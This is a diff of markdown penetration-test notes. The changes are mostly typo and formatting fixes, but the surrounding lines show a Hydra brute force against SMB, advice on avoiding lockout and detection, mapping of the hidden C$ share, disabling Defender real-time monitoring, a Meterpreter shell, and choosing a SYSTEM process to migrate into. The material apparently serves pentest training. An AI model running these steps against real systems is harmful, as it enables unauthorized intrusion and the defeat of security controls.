@@ -12,6 +12,7 @@ banner: https://files.oaiusercontent.com/file-pFbFziWYk9GxtnJMnwHM48hn?se=2023-1
 # 1.0 HYDRA
 ---
 ![](attachment/dd90cf9e9ba90eb59a24a747fa2c6118.svg)
+
 After completing the enumeration stage of the penetration test, we would have obtained a comprehensive list of the administrators. Upon obtaining this list, we will proceed to extract the usernames and compile them into a .txt file.  
   
 Please find below the complete list of administrators:~
@@ -38,7 +39,7 @@ if you want to speed this up you can run this instead
 ```bash
 hydra -L users.txt -P /usr/share/wordlists/small.txt -t 16 smb://192.168.10.1
 ```
->This is a parallel task, it will speed up the speed of the bruteforce attack, but may also trigger a lockout 
+>This is a parallel task, it will speed up the speed of the brute force attack, but may also trigger a lockout 
 >>to avoid detection, it would be wise to create a script that has sleep intervals or add -t 4 somewhere in the command
 
 ###### 1.2 Hydra Command Breakdown
@@ -48,7 +49,7 @@ hydra -L users.txt -P /usr/share/wordlists/small.txt -t 16 smb://192.168.10.1
 
 **Breakdown**:
 
-- **`hydra`**: The main command for Hydra, a popular password cracking tool.
+- **`hydra`**: The main command for Hydra, a popular password-cracking tool.
 - **`-L users.txt`**: Specifies the list of usernames to try, where 'users.txt' contains one username per line.
 - **`-P /usr/share/wordlists/small.txt`**: Points to the password list file, here 'small.txt' from '/usr/share/wordlists/'.
 - **`-t 16`**: Sets the number of parallel connections (threads) to 16, affecting the attack's speed.
@@ -74,9 +75,9 @@ If successful, penetration testers at this stage would effectively demonstrate t
 
 This task can be accomplished by assigning a drive letter (e.g. Q) to a share. In this specific case, mapping a drive to the C drive on the server is recommended. It is worth noting that the C drive is automatically shared as c$ (the $ signifying that it is a hidden share).
 
-> from the main windows desktop, open a command prompt (not as admin) and input the following
+> From the main Windows desktop, open a command prompt (not as admin) and input the following
 
-```powershell
+```PowerShell
 net use q: \\192.168.10.1\c$
 ```
 
@@ -107,6 +108,7 @@ Enter the user name for '192.168.10.1': A.George    Enter the password for 192.1
 ```
 
 now when we open up explorer we will see a new drive under This PC
+
 ![](attachment/203c010f5b92a51a7a386c82dad69675.png)
 ![](attachment/8dc43ac5a6fd0ed69f023446f7718b9d.png)
 
@@ -206,6 +208,7 @@ C:\Windows\system32> Set-MpPreference -DisableRealtimeMonitoring $true
 
 
 - Back in **msfconsole** run the exploit command again
+
 ![](attachment/2f07b45067da2a9647cc885f66cb0462.png)
 >Meterpreter Shell
 >> "im In"
@@ -227,7 +230,9 @@ ps
 ```
 
 - Look for a service running under User as **SYSTEM**
+- 
 ![](attachment/f1a03dda4adca8d8a49f16de03ede7ef.png)
+
 > Their are a few running as system here.
 > > 752 620 svchost.exe is a good choice
 
